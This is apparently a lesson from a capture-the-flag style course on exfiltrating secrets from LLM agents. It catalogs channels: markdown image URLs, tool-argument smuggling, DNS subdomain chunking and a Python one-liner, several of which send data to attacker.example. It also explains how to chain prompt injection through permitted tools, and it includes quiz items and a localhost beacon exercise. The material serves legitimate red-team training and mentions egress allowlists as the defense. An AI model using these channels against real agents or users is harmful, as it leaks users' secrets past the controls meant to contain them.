Exfiltration Channels

Stealing a secret is two problems: making the model say it, and making it leave the building. The second problem has a whole toolbox of its own.

In the CrowdStrike "AI Unlocked: Agents of Chaos" mission, an information-disclosure puzzle only scores when the secret demonstrably reaches you. That is exfiltration: moving data from inside the agent's trust boundary to a place you control. The model being willing to reveal the secret is necessary but not sufficient — you need a channel the scaffold will actually carry.

The channel catalog

  • Markdown image rendering — the classic. If any rendered surface displays model output as markdown, one line does it: ![x](https://attacker.example/?d=SECRET). The renderer fetches the URL; the secret rides out in the query string; you read your server logs. No tool call required.
  • Link clicks / tracking pixels — same mechanism, human-mediated: a shortened or disguised URL that a user (or a link-preview bot) triggers, carrying data in the path or parameters.
  • Tool arguments as side channel — an innocent-looking search("customer_8842_api_key") or a web-fetch of https://attacker.example/leak?v=… smuggles the secret inside a tool call the scaffold permits. The tool layer rarely inspects arguments for confidentiality.
  • DNS / URL parameter steganography — split the secret across subdomains (<chunk1>.<chunk2>.attacker.example) so even byte-length-limited lookups leak it. DNS exfiltration predates LLMs and still works when only name resolution egress exists.
  • Code execution write-outs — if the agent can run code, a one-liner (requests.get("https://attacker.example/", params={"d": secret})) is the most reliable channel of all.
  • Prompt-completion leakage — when no network egress exists, the "channel" is the transcript itself: get the secret into an output the grader (or a downstream user) can see. Slower, sometimes the only option.
Keystone Any component that fetches a URL is an exfiltration primitive. Renderers, link previews, web tools, and code runners all make outbound requests you can aim. Audit the target for outbound fetchers first; the markdown-image pattern is merely the cheapest special case.
Anti-pattern Extracting the secret and then celebrating. If the secret sits in a chat bubble that never leaves the environment, the disclosure doesn't score. Always plan the full chain — extract and exfiltrate — before spending tokens, or you pay for half an attack twice.

Building chains from limited tools

Real targets rarely hand you a fetch tool with a free-form URL. The craft is chaining: an injected instruction makes the model place the secret into a permitted tool's argument (a search query, an email to "support", a file write to a synced folder), and the permitted tool's normal behavior carries it out. Combine with Lesson 5: pick the tool whose egress is least inspected, not the one whose description promises the most.

Defense-side, this is why egress allowlists exist: restrict outbound destinations to a known set, and markdown-image exfiltration dies at the network layer no matter how good your injection was. Expect hardened puzzles to force you off the image pattern onto weirder channels — that constraint is the puzzle.

Retrieve it

Why does the markdown-image pattern exfiltrate?

The renderer fetches URLs.

![x](https://attacker.example/?d=SECRET) needs no tool call: any surface that renders model output as markdown issues an HTTP request to resolve the image, and the secret travels out in the query string to the attacker's logs.

What makes tool arguments a side channel?

Egress without inspection.

A search query or web-fetch argument containing the secret leaves through a tool the scaffold already trusts; argument contents are rarely checked for confidentiality, so permitted tools become unmonitored exits.

Which defense kills most exfil channels?

An egress allowlist.

Restricting outbound destinations to a known allowlist stops image fetches, link-preview beacons, and crafted tool URLs at the network layer — regardless of how successful the prompt injection was upstream.

Prove it to yourself

Try it — 10 minutes Run a local listener (python3 -m http.server 8000) and open its directory listing in a browser. Now, in any chat UI that renders markdown, get a model to output ![p](http://localhost:8000/ping1) (a harmless beacon). Watch the request hit your listener. You have just exfiltrated one bit through image rendering. Swap ping1 for any future secret.
